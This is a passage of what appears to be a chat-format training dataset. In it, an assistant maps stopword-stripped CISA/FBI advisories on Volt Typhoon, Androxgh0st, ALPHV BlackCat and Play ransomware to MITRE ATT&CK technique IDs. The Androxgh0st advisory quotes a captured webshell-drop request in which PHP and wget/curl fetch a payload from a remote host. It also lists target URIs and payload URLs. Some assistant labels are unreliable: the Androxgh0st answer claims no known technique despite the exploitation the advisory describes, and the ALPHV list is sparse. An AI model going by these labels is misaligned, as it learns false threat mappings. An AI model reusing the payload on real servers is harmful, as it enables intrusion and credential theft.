necessary apply best practices including auditing network systems using rdp closing unused rdp ports logging rdp login attempts disable server message block smb protocol version 1 upgrade version 3 smbv3 mitigating existing dependencies existing systems applications may break disabled harden smbv3 implementing guidance included joint stopransomware guide see page 8 guide apply mitigations joint guide securing remote access software secure sensitive data securely store sensitive data including operational technology documentation network diagrams etc ensuring authenticated authorized users access data implement network segmentation ensure sensitive accounts use administrator credentials hardened secure computers practice reduce lateral movement exposure within networks conduct comprehensive trust assessments identify businesscritical trusts apply necessary controls prevent unauthorized crossforestdomain traversal harden federated authentication enabling secure identifier sid filtering selective authentication ad trust relationships restrict unauthorized access across domain boundaries implement network segmentation isolate federation servers systems limit allowed traffic systems protocols require access accordance zero trust principles secure cloud assets harden cloud assets accordance vendorprovided industry standard hardening guidance organizations microsoft cloud infrastructure see cisas microsoft 365 security configuration baseline guides provide minimum viable secure configuration baselines microsoft defender office 365 azure active directory known microsoft entra id exchange online onedrive business power bi power platform sharepoint online teams additional guidance see australian signals directorates blueprint secure cloud organizations google cloud infrastructure see cisas google workspace security configuration baseline guides provide minimum viable secure configuration baselines groups business gmail google calendar google chat google common controls google classroom google drive docs google meet google sites revoke unnecessary public access cloud environment involves reviewing restricting public endpoints ensuring services like storage accounts databases virtual machines publicly accessible unless absolutely necessary disable legacy authentication protocols across cloud services platforms legacy protocols frequently lack support advanced security mechanisms multifactor authentication rendering susceptible compromises instead enforce use modern authentication protocols support stronger security features like mfa tokenbased authentication adaptive authentication measures enforce practice use conditional access policies policies initially run reportonly mode identify potential impacts plan mitigations fully enforcing approach allows organizations systematically control access cloud resources significantly reducing risk unauthorized access potential compromise regularly monitor audit privileged cloudbased accounts including service accounts frequently abused enable broad cloud resource access persistence prepared ensure logging turned application access security logs eg intrusion detection systemsintrusion prevention systems firewall data loss prevention vpnscpg 2t given volt typhoons use lotl techniques significant dwell time application event logs may valuable resource hunt volt typhoon activity logs typically remain endpoints relatively long periods time ot assets logs nonstandard available collect network traffic communications assets assets implement file integrity monitoring fim tools detect unauthorized changes store logs central system security information event management siem tool central database ensure logs accessed modified authorized authenticated userscpg 2u store logs period informed risk pertinent regulatory guidelines tune log alerting reduce noise ensuring alerts highrisk activities information alert tuning see joint guide identifying mitigating living land techniques establish continuously maintain baseline installed tools software account behavior network traffic way network defenders identify potential outliers may indicate malicious activity note information establishing baseline see joint guide identifying mitigating living land techniques document list threats cyber actor ttps relevant organization eg based industry sectors maintain ability via rules alerting commercial prevention detection systems detect instances key threatscpg 3a implement periodic training employees contractors covers basic security concepts phishing business email compromise basic operational security password security etc well fostering internal culture security cyber awarenesscpg 2i tailor training network personneladministrators key staff based relevant organizational cyber threats ttps volt typhoon example communicate volt typhoon actors known target personal email accounts staff encourage staff protect personal email accounts using strong passwords implementing mfa addition basic cybersecurity training ensure personnel maintain secure ot part regular duties receive otspecific cybersecurity training least annual basiscpg 2j educate users risks associated storing unprotected passwords ot administrators defenders change default passwordscpg 2a ensure meet policy requirements complexity assets password changed implement compensating controls device example segment device separate enclaves implement increased monitoring logging require passwords ot passwordprotected assets least 15 characters technically feasible instances minimum passwords lengths technically feasible example assets remote locations apply compensating controls record controls log login attemptscpg 2b enforce strict access policies accessing ot networks develop strict operating procedures ot operators details secure configuration usage segment ot assets environments bycpg 2f denying connections ot network default unless explicitly allowed eg ip address port specific system functionality requiring necessary communications paths ot networks pass intermediary properly configured firewall bastion host jump box demilitarized zone dmz closely monitored captures network logs allows connections approved assets closely monitor connections ot networks misuse anomalous activity ot protocols monitor unauthorized controller change attempts implement integrity checks controller process logic known good baseline ensure process controllers prevented remaining remote program mode operation possible lock limit set points control processes reduce consequences unauthorized controller access prepared determining critical operational processes reliance key infrastructure maintain regularly update inventory organizational ot assets understand evaluate cyber risk asoperated ot assets create accurate asoperated ot network map identify ot network interdependencies identifying resilience plan addresses operate lose access control andor ot environment plan continue operations control system malfunctioning inoperative actively acting contrary safe reliable operation process develop workarounds manual controls ensure ics networks isolated connection compromised environment creates risk safe reliable operation ot processes create regularly exercise incident response plan regularly test manual controls critical functions kept running ot networks need taken offline implement regular data backup procedures ot networks regularly test backup procedures follow riskinformed guidance joint advisory nsa cisa recommend immediate actions reduce exposure across operational technologies control systems nsa advisory stop malicious cyber activity connected operational technology contact information us organizations report suspicious criminal activity related information found joint cybersecurity advisory contact cisas 247 operations center reportcisagov 1844saycisa 18447292472 local fbi field office available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact nsa client requirements general cybersecurity inquiries contact cybersecurityrequestsnsagov water wastewater systems sector organizations contact epa water infrastructure cyber resilience division watercybertaepagov voluntarily provide situational awareness entities required report incidents doe follow established reporting requirements appropriate energy sector inquiries contact energysrmahqdoegov transportation entities regulated tsa report cisa central accordance requirements found applicable security directives security programs tsa order australian organizations visit cybergovau call 1300 292 371 1300 cyber 1 report cybersecurity incidents access alerts advisories canadian organizations report incidents emailing cccs contactcybergcca new zealand organizations report cyber security incidents incidentsncscgovtnz call 04 498 7654 united kingdom organizations report significant cyber security incident ncscgovukreportanincident monitored 24 hours urgent assistance call 03000 200 973 validate security controls addition applying mitigations authoring agencies recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory authoring agencies recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 5 table 17 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process authoring agencies recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory references1 fofa2 microsoft volt typhoon targets us critical infrastructure livingofftheland techniques3 github fatedierfrp fast reverse proxy help expose local server behind nat firewall internet4 github sandialabsgait zeek extension collect metadata profiling endpoints proxies5 zeek network security monitor resources microsoft volt typhoon targets us critical infrastructure livingofftheland techniquessecureworks chinese cyberespionage group bronze silhouette targets us government defense organizations disclaimer information report provided informational purposes authoring agencies endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring authoring agencies acknowledgements fortinet microsoft contributed advisory version history february 7 2024 initial versionmarch 7 2024 updated mitigations section add recommendation end life technology appendix volt typhoon observed commands lotl activity see table 2 table 3 volt typhoon commands powershell scripts observed us authoring agencies incident response activities additional commands used volt typhoon see joint advisory peoples republic china statesponsored cyber actor living land evade detection appendix b indicators compromise see table 4 volt typhoon iocs obtained us authoring agencies incident response activities note see mar104483621v1 information malware appendix c mitre attck tactics techniques see table 5 table 17 referenced threat actor tactics techniques advisory product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1003.003, T1007, T1010, T1012, T1016, T1016.001, T1021.001, T1021.007, T1027.002, T1033, T1036.005, T1046, T1047, T1048, T1057, T1059, T1059.001, T1059.004, T1068, T1069, T1070.001, T1070.004, T1074, T1078, T1078.004, T1082, T1083, T1087.001, T1090, T1090.001, T1090.003, T1105, T1110.002, T1112, T1113, T1120, T1124, T1133, T1190, T1217, T1218, T1518, T1550, T1552, T1552.004, T1555, T1555.003, T1560, T1560.001, T1563, T1573, T1583.003, T1589, T1589.002, T1590, T1593, T1614, T1654"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious cyber activity prioritize patching known exploited vulnerabilities internetfacing systems review ensure necessary servers services exposed internet review platforms services credentials listed env files unauthorized access use summary federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint cybersecurity advisory csa disseminate known indicators compromise iocs tactics techniques procedures ttps associated threat actors deploying androxgh0st malware multiple ongoing investigations trusted third party reporting yielded iocs ttps provided information androxgh0st malwares ability establish botnet identify compromise vulnerable networks fbi cisa encourage organizations implement recommendations mitigations section csa reduce likelihood impact cybersecurity incidents caused androxgh0st infections download pdf version report aa24016a known indicators compromise associated androxgh0st malware pdf 57640 kb aa24016a known indicators compromise associated androxgh0st malware spanish pdf 35345 kb downloadable copy iocs see aa24016a stix xml xml 4581 kb aa24016a stix json json 3987 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques corresponding mitigation andor detection recommendations assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview androxgh0st malware observed establishing botnet victim identification exploitation target networks according open source reporting1 androxgh0st pythonscripted malware primarily used target env files contain confidential information credentials various high profile applications ie amazon web servicesaws microsoft office 365 sendgrid twilio laravel web application framework androxgh0st malware also supports numerous functions capable abusing simple mail transfer protocol smtp scanning exploiting exposed credentials application programming interfaces apis web shell deployment targeting phpunit androxgh0st malware ttps commonly involves use scripts conducting scanning searching websites specific vulnerabilities particular threat actors deploying androxgh0st observed exploiting cve20179841 remotely run hypertext preprocessor php code fallible websites via phpunit websites using phpunit module internetaccessible exposed vendor folders subject malicious http post requests vendorphpunitphpunitsrcutilphpevalstdinphp uniform resource identifier uri php page runs php code submitted post request allows threat actors remotely execute code malicious actors likely use androxgh0st download malicious files system hosting website threat actors able set fake illegitimate page accessible via uri provide backdoor access website allows threat actors download additional malicious files operations access databases laravel framework targeting androxgh0st malware establishes botnet scan websites using laravel web application framework identifying websites using laravel web application threat actors attempt determine domains rootlevel env file exposed contains credentials accessing additional services note env files commonly store credentials tokens threat actors often target env files steal credentials within environment variables env file exposed threat actors issue get request env uri attempt access data page alternatively androxgh0st may issue post request uri post variable named 0x containing certain data sent web server data frequently used identifier threat actor method appears used websites debug mode ie nonproduction websites exposed internet successful response either methods allows threat actors look usernames passwords andor credentials pertaining services email via smtp aws accounts androxgh0st malware also access application key laravel application website threat actors successfully identify laravel application key attempt exploitation using key encrypt php code encrypted code passed website value crosssite forgery request xsrf token cookie xsrftoken included future get request website vulnerability defined cve201815133 indicates laravel applications xsrf token values subject unserialized call allow remote code execution threat actors upload files website via remote access apache web server targeting correlation cve202141773 androxgh0st actors observed scanning vulnerable web servers running apache http server versions 2449 2450 threat actors identify uniform resource locators urls files outside root directory path traversal attack files protected request denied configuration common gateway interface cgi scripts enabled may allow remote code execution threat actors obtain credentials services using methods may use credentials access sensitive data use services conduct additional malicious operations example threat actors successfully identify compromise aws credentials vulnerable website observed attempting create new users user policies additionally andoxgh0st actors observed creating new aws instances use conducting additional scanning activity indicators compromise iocs based investigations analysis following requests associated androxgh0st activity incoming get post requests following uris vendorphpunitphpunitsrcutilphpevalstdinphp env incoming post requests following strings0x5b5dandroxgh0st immutablemultidict0x androxgh0st previously listed post request strings name androxgh0st observed replaced monikers additional uris observed fbi trusted third party used threat actors credential exfiltration include info phpinfo phpinfophp phpinfo1 frontenddevphp profilerphpinfo debugdefaultviewpanelconfig configjson json gitconfig liveenv envdist envsave environmentsenvproduction envproductionlocal envproject envdevelopment envproduction envprod envdevelopmentlocal envold insertdirectoryenv note actor may attempt multiple different potential uri endpoints scanning env file example dockerenv localenv awscredentials awscredentials awsconfig git test admin backend app current demo api backup beta cron develop laravel laravelcore gistscache testphp infophp env adminappenv20 laravelenv20 sharedenv20 envproject20 appsenv20 developmentenv20 liveenv20 envdevelopment20 targeted uris webshell drop envvendorphpunitphpunitsrcutilphpevalstdinphp adminvendorphpunitphpunitsrcutilphpevalstdinphp apivendorphpunitphpunitsrcutilphpevalstdinphp backupvendorphpunitphpunitsrcutilphpevalstdinphp blogvendorphpunitphpunitsrcutilphpevalstdinphp cmsvendorphpunitphpunitsrcutilphpevalstdinphp demovendorphpunitphpunitsrcutilphpevalstdinphp devvendorphpunitphpunitsrcutilphpevalstdinphp laravelvendorphpunitphpunitsrcutilphpevalstdinphp libphpunitphpunitsrcutilphpevalstdinphp libphpunitphpunitutilphpevalstdinphp libphpunitsrcutilphpevalstdinphp libphpunitutilphpevalstdinphp newvendorphpunitphpunitsrcutilphpevalstdinphp oldvendorphpunitphpunitsrcutilphpevalstdinphp panelvendorphpunitphpunitsrcutilphpevalstdinphp phpunitphpunitsrcutilphpevalstdinphp phpunitphpunitutilphpevalstdinphp phpunitsrcutilphpevalstdinphp phpunitutilphpevalstdinphp protectedvendorphpunitphpunitsrcutilphpevalstdinphp sitesalllibrariesmailchimpvendorphpunitphpunitsrcutilphpevalstdinphp vendorphpunitphpunitsrcutilphpevalstdinphp vendorphpunitphpunitutilphpevalstdinphp vendorphpunitsrcutilphpevalstdinphp vendorphpunitutilphpevalstdinphp wpcontentpluginscloudflarevendorphpunitphpunitsrcutilphpevalstdinphp wpcontentpluginsdzsvideogalleryclasspartsvendorphpunitphpunitsrcutilphpevalstdinphp wpcontentpluginsjekyllexportervendorphpunitphpunitsrcutilphpevalstdinphp wpcontentpluginsmmpluginincvendorsvendorphpunitphpunitsrcutilphpevalstdinphp wwwvendorphpunitphpunitsrcutilphpevalstdinphp adminckeditorpluginsajaxplorerphpunitsrcutilphpevalstdinphp adminvendorphpunitphpunitsrcutilphpevalstdinphp apivendorphpunitphpunitsrcutilphpevalstdinphp apivendorphpunitphpunitsrcutilphptemplateevalstdinphp labvendorphpunitphpunitsrcutilphpevalstdinphp laravelvendorphpunitphpunitsrcutilphpevalstdinphp laravelwebvendorphpunitphpunitsrcutilphpevalstdinphp laravel52vendorphpunitphpunitsrcutilphpevalstdinphp laravelaovendorphpunitphpunitsrcutilphpevalstdinphp libphpunitphpunitsrcutilphpevalstdinphp libphpunitphpunitutilphpevalstdinphp libphpunitphpunitutilphpeval stdinphp20libphpunitsrcutilphpevalstdinphp libphpunitsrcutilphpevalstdinphp libphpunitutilphpevalstdinphp libvendorphpunitphpunitsrcutilphpevalstdinphp librariesvendorphpunitphpunitsrcutilphpevalstdinphp phpunitphpunitsrcutilphpevalstdinphp phpunitphpunitutilphpevalstdinphp phpunitphpunitutilphpevalstdinphp20phpunitsrcutilphpevalstdinphp phpunitsrcutilphpevalstdinphp phpunitutilphpevalstdinphp phpunitutilphpevalstdinphp20libphpunitphpunitsrcutilphpevalstdinphp vendorphpunitphpunitsrcutilphpevalstdinphp vendorphpunitphpunitsrcutilphpevalstdinphpdev vendorphpunitphpunitutilphpevalstdinphp vendorphpunitphpunitutilphpevalstdinphp20vendorphpunitsrcutilphpevalstdinphp vendorphpunitsrcutilphpevalstdinphp vendorphpunitutilphpevalstdinphp vendorphpunitutilphpevalstdinphp20 phpunitphpunitsrcutilphpevalstdinphp yiivendorphpunitphpunitsrcutilphpevalstdinphp zendvendorphpunitphpunitsrcutilphpevalstdinphp example attempted credential exfiltration honeypot open proxies post awscredentials http11host wwwexamplecomuseragent mozilla50 x11 linux x8664 applewebkit53736 khtml like gecko chrome8104044129 safari53736acceptencoding gzip deflateaccept connection keepalivecontentlength 20contenttype applicationxwwwformurlencoded0x5b5dandroxgh0st example attempted webshell drop honeypot open proxies get httpwwwexamplecomlibvendorphpunitphpunitsrcutilphpevalstdinphp http11host wwwexamplecomuseragent mozilla50 windows nt 100 win64 x64 applewebkit53736 khtml like gecko chrome116000 safari53736 edg1160193876acceptencoding gzip deflateaccept connection keepalivexforwardedfor 200172238135contentlength 279php fileputcontentsevilphpfilegetcontentshxxpsmcrockylinuxsiseoforcetriggersfileseviltxt systemwget hxxpsmcrockylinuxsiseoforcetriggersfileseviltxt evilphpcurl hxxpsmcrockylinuxsiseoforcetriggersfileseviltxt evilphp monikers used instead androxgh0st 0x5b5d ridho aws 0x0x xx nopebee7 smtpex evileyes0 privangga drcrypter errorcool drosteam androxmen crack3rz b4bbyghost 0x0day janc0xsec blackb0x 0x1331day graber example malware drops evalstdinphp hxxpsmcrockylinuxsiseoforcetriggersfileseviltxt59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4hxxpschainventurescoukwellknownaasdcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6hxxpdownloadasyncfoxxyzdownloadxmrigx866423fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066hxxpspastebincomrawzw0gampcca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72hxxprawgithubusercontentcom0x5a455553marijuanamastermarijuanaphp0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317efhxxp4595147236tmpx86646b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbchxxpmaindsnovhdnspwerbb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7hxxptangibledrinksurgeshconfigxtxtde1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba mitre attck tactics techniques see tables 110 referenced threat actor tactics techniques advisory mitigations fbi cisa recommend implementing mitigations improve organizations cybersecurity posture based androxgh0st threat actor activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections mitigations apply critical infrastructure organizations network defenders fbi cisa recommend software manufacturers incorporate secure design principles tactics software development practices limiting impact actor techniques strengthening customers security posture information secure design see cisas secure design webpage fbi cisa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce risk compromise actors using androxgh0st malware keep operating systems software firmware date specifically ensure apache servers running versions 2449 2450 timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systems verify default configuration uris deny requests unless specific need accessible ensure live laravel applications debug testing mode remove cloud credentials env files revoke cloud providers safer ways provide temporary frequently rotated credentials code running inside web server without storing file onetime basis previously stored cloud credentials ongoing basis types credentials removed review platforms services credentials listed env file unauthorized access use scan servers file system unrecognized php files particularly root directory vendorphpunitphpunitsrcutilphp folder review outgoing get requests via curl command file hosting sites github pastebin etc particularly request accesses php file validate security controls addition applying mitigations fbi cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory authoring agencies recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 110 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory reporting fbi encourages organizations report information concerning suspicious criminal activity local fbi field office regards specific information appears csa indicators always evaluated light organizations complete security situation available report submitted include date time location type activity number people type equipment used activity name submitting company organization designated point contact reports submitted fbi internet crime complaint center ic3 local fbi field office cisa via incident reporting system 247 operations center reportcisagov calling 1844saycisa 18447292472 resources cisa known exploited vulnerabilities catalog cisa mitre best practices mitre attck mapping cisa decider tool nist cve20179841 nist cve201815133 nist cve202141773 cisa crosssector cybersecurity performance goals cisa secure design references fortinet fortiguard labs threat signal report androxgh0st malware actively used wild acknowledgements amazon contributed csa disclaimer information report provided informational purposes fbi cisa endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa version history january 16 2024 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate threat ransomware routinely take inventory assets data identify authorized unauthorized devices software prioritize remediation known exploited vulnerabilities enable enforce multifactor authentication strong passwords close unused ports remove applications deemed necessary daytoday operations summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisaand department health human services hhs releasing joint csa disseminate known iocs ttps associated alphv blackcat ransomware service raas identified fbi investigations recently february 2024 advisory provides updates fbi flash blackcatalphv ransomware indicators compromise released april 19 2022 advisory released december 19 2023 alphv blackcat actors since employed improvised communication methods creating victimspecific emails notify initial compromise since middecember 2023 nearly 70 leaked victims healthcare sector commonly victimized likely response alphv blackcat administrators post encouraging affiliates target hospitals operational action group infrastructure early december 2023 fbi cisa hhs encourage critical infrastructure organizations implement recommendations mitigations section csa reduce likelihood impact alphv blackcat ransomware data extortion incidents february 2023 alphv blackcat administrators announced alphv blackcat ransomware 20 sphynx update rewritten provide additional features affiliates better defense evasion additional tooling alphv blackcat update capability encrypt windows linux devices vmware instances alphv blackcat affiliates extensive networks experience ransomware data extortion operations download pdf version report aa23353a stopransomware alphv blackcat update pdf 57824 kb downloadable copy iocs see aa23353a stix xml xml 4614 kb aa23353a stix json json 3293 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool alphv blackcat affiliates use advanced social engineering techniques open source research company gain initial access actors pose company andor helpdesk staff use phone calls sms messages obtain credentials employees access target network alphv blackcat affiliates use uniform resource locators urls livechat victims convey demands initiate processes restore victims encrypted files gaining access victim network alphv blackcat affiliates deploy remote access software anydesk mega sync splashtop preparation data exfiltration alphv blackcat affiliates create user account aadmin use kerberos token generation domain access gaining access networks use legitimate remote access tunneling tools plink ngroks0508 alphv blackcat affiliates claim use brute ratel c4s1063 cobalt strikes1054as beacons command control servers alphv blackcat affiliates use open source adversaryinthemiddle attack framework evilginx2 allows obtain multifactor authentication mfa credentials login credentials session cookies actors also obtain passwords domain controller local network deleted backup servers move laterally throughout network evade detection affiliates employ allowlisted applications metasploit installed domain controller logs cleared exchange server meganz dropbox used move exfiltrate andor download victim data ransomware deployed ransom note embedded filetxt according public reporting affiliates additionally used poortry stonestop terminate security processes alphv blackcat affiliates exfiltrate data gaining access extort victims without deploying ransomware exfiltrating andor encrypting data alphv blackcat affiliates communicate victims via tors0183 tox email encrypted applications threat actors delete victim data victims system alphv blackcat affiliates offer provide unsolicited cyber remediation advice incentive payment offering provide victims vulnerability reports security recommendations detailing penetrated system prevent future revictimization upon receipt ransom paymentthe alphv blackcat encryptor results file following naming convention recoversevendigit extension filestxt figure 1 ransom note instruction indicators compromise iocs mitre attck tactics techniques see table 5 table 7 referenced threat actor tactics techniques advisory incident response compromise detected organizations quarantine take offline potentially affected hosts reimage compromised hosts provision new account credentials collect review artifacts running processesservices unusual authentications recent network connections report compromise phishing incident cisa via cisas 247 operations center reportcisagov 8882820870 state local tribal territorial government entities also report msisac soccisecurityorg 8667874722 report spoofing phishing attempts report youve victim file complaint fbis internet crime complaint center ic3 contact local fbi field office report incident mitigations mitigations apply critical infrastructure organizations network defenders fbi cisa hhs recommend software manufactures incorporate secure design principles tactics software development practices limiting impact ransomware techniques thus strengthening security posture customers information secure design see cisas secure design webpage joint guide fbi cisa hhs recommend organizations implement mitigations improve organizations cybersecurity posture based threat actor activity reduce risk compromise alphv blackcat threat actors mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protectionsdue threat alphv blackcats poses healthcare sector healthcare organizations look healthcare public health hph sector cybersecurity performance goals implement cybersecurity protections common threats tactics techniques procedures used sector secure remote access tools implementing application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation applying recommendations cisas joint guide securing remote access software implementing fidowebauthn authentication public key infrastructure pkibased mfacpg 2hhph cpg multifactor authentication mfa implementations resistant phishing susceptible push bombing sim swap attacks techniques known used alphv blackcat affiliates see cisas fact sheet implementing phishingresistant mfa information identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network trafficcpg 51hph cpg detect respond relevant threats tactics techniques procedures including lateral movement activity network endpoint detection response edr tools useful detecting lateral connections insight common uncommon network connections host implement user training social engineering phishing attackscpg 2ihph cpg basic cybersecurity training regularly educate users identifying suspicious emails links interacting suspicious items importance reporting instances opening suspicious emails links attachments potential lures implement internal mail messaging monitoring monitoring internal mail messaging traffic identify suspicious activity essential users may phished outside targeted network without knowledge organizational security team establish baseline normal network traffic scrutinize deviations implement free security toolsto prevent cyber threat actors redirecting users malicious websites steal credentials information see cisas free cybersecurity services tools webpage install maintain antivirus software antivirus software recognizes malware protects computer installing antivirus software reputable vendor important step preventing detecting infections always visit vendor sites directly rather clicking advertisements email links attackers continually creating new viruses forms malicious code important keep antivirus software date validate security controls addition applying mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 13 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa fbi recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource reduce risk ransomware attack stopransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment health human services hph cybersecurity gateway hosts hph cpgs links hhs cybersecurity resources disclaimer information report provided informational purposes fbi cisa hhs endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa hhs version history december 19 2023 initial versionfebruary 27 2024 update product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1555, T1557, T1558, T1598"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats play ransomware prioritize remediating known exploited vulnerabilities enable multifactor authentication mfa services extent possible particularly webmail vpn accounts access critical systems regularly patch update software applications latest versions conduct regular vulnerability assessments summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa australian signals directorates australian cyber security centre asds acsc releasing joint csa disseminate play ransomware groups iocs ttps identified fbi investigations recently october 2023 since june 2022 play also known playcrypt ransomware group impacted wide range businesses critical infrastructure north america south america europe october 2023 fbi aware approximately 300 affected entities allegedly exploited ransomware actors australia first play ransomware incident observed april 2023 recently november 2023 play ransomware group presumed closed group designed guarantee secrecy deals according statement groups data leak website play ransomware actors employ doubleextortion model encrypting systems exfiltrating data ransom notes include initial ransom demand payment instructions rather victims instructed contact threat actors via email fbi cisa asds acsc encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents includes requiring multifactor authentication maintaining offline backups data implementing recovery plan keeping operating systems software firmware date download pdf version report aa23352a stopransomware play ransomware pdf 53619 kb downloadable copy iocs see aa23352a stix xml xml 3487 kb aa23352a stix json json 3022 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck enterprise section referenced tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool initial access play ransomware group gains initial access victim networks abuse valid accounts exploitation publicfacing applications specifically known fortios cve201813379 cve202012812 microsoft exchange proxynotshellcve202241040 cve202241082 vulnerabilities play ransomware actors observed use externalfacing services remote desktop protocol rdp virtual private networks vpn initial access discovery defense evasion play ransomware actors use tools like adfind run active directory queries grixba1 informationstealer enumerate network information scan antivirus software actors also use tools like gmer iobit powertool disable antivirus software remove log files instances cybersecurity researchers observed play ransomware actors using powershell scripts target microsoft defender2 lateral movement execution play ransomware actors use command control c2 applications including cobalt strike systembc tools like psexec assist lateral movement file execution established network ransomware actors search unsecured credentials use mimikatz credential dumper gain domain administrator access according open source reporting2 enumerate vulnerabilities play ransomware actors use windows privilege escalation awesome scripts winpeas search additional privilege escalation paths actors distribute executables via group policy objects exfiltration encryption play ransomware actors often split compromised data segments use tools like winrar compress files rar format exfiltration actors use winscp transfer data compromised network actorcontrolled accounts following exfiltration files encrypted aesrsa hybrid encryption using intermittent encryption encrypting every file portion 0x100000 bytes3 note system files skipped encryption process play extension added file names ransom note titled readmetxt placed file directory c impact play ransomware group uses doubleextortion model encrypting systems exfiltrating data ransom note directs victims contact play ransomware group email address ending gmxde ransom payments paid cryptocurrency wallet addresses provided play actors victim refuses pay ransom demand ransomware actors threaten publish exfiltrated data leak site tor network onion url leveraged tools table 1 lists legitimate tools play ransomware actors repurposed operations legitimate tools listed product publicly available use tools applications attributed malicious without analytical evidence support used direction controlled threat actors indicators compromise see table 2 play ransomware iocs obtained fbi investigations october 2023 mitre attck tactics techniques see table 3table 11 referenced threat actor tactics techniques advisory mitigations mitigations apply critical infrastructure organizations network defenders fbi cisa asds acsc recommend software manufacturers incorporate securebydesign default principles tactics software development practices limit impact ransomware techniques threat actors leveraging backdoor vulnerabilities remote software systems thus strengthening security posture customersfor information secure design see cisas secure design default webpage joint guide fbi cisa asds acsc recommend organizations apply following mitigations limit potential adversarial use common system network discovery techniques reduce risk compromise play ransomware mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats ttps visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections implement recovery plan maintain retain multiple copies sensitive proprietary data serverscpg 2f 2r 2s physically separate segmented secure location ie hard 